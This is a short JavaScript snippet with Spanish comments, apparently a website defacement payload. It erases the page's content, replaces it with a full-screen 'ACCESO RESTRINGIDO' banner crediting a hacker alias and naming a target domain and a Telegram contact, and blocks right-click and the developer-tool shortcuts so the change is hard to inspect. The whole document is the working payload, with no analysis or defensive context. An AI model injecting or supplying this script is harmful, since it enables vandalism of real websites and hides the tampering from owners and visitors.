(function() {
    // 1. Limpieza total y bloqueo de scroll
    document.body.innerHTML = "";
    document.head.innerHTML = "<title>ACCESO RESTRINGIDO</title>";
    document.body.style.overflow = "hidden"; 
    
    // 2. Inyectar diseño de alto impacto (Pantalla Completa)
    document.body.innerHTML = `
    <div style="position:fixed; top:0; left:0; width:100vw; height:100vh; background-color:black; color:red; display:flex; flex-direction:column; justify-content:center; align-items:center; z-index:9999999; font-family:Impact, sans-serif; text-align:center; border: 15px solid red; box-sizing: border-box;">
        <h1 style="font-size:70px; margin:0; text-shadow: 5px 5px #550000;">⚠️ ACCESO RESTRINGIDO ⚠️</h1>
        <hr style="width:80%; border: 1px solid red; margin: 20px 0;">
        <p style="font-size:35px; color:white; text-transform:uppercase; letter-spacing: 2px;">
            ATAQUE PERPETRADO por: <span style="color:red;">HACKER DE PAPEL PARA MRFRESAYT</span>
        </p>
        <div style="margin-top:20px; color:#00FF00; font-family:monospace; font-size:25px; background: #111; padding: 10px; border: 1px dashed #00FF00;">
            [ EXPLOIT CONFIRMADO: KZTEAM.ONLINE ]
        </div>
        <div style="margin-top:60px; color:white; font-size:30px;">
            CONTACTO PARA SOPORTE TÉCNICO:
            <br>
            <span style="color:#0088cc; font-size:45px;">📱 Telegram: @Fullcrackyt</span>
        </div>
    </div>`;

    // 3. Bloqueo de seguridad (Derecho, F12, Ctrl+Shift+I/J/C)
    document.oncontextmenu = function(){ return false; };
    document.onkeydown = function(e) {
        if(e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74 || e.keyCode == 67))) {
            return false;
        }
    };
})();
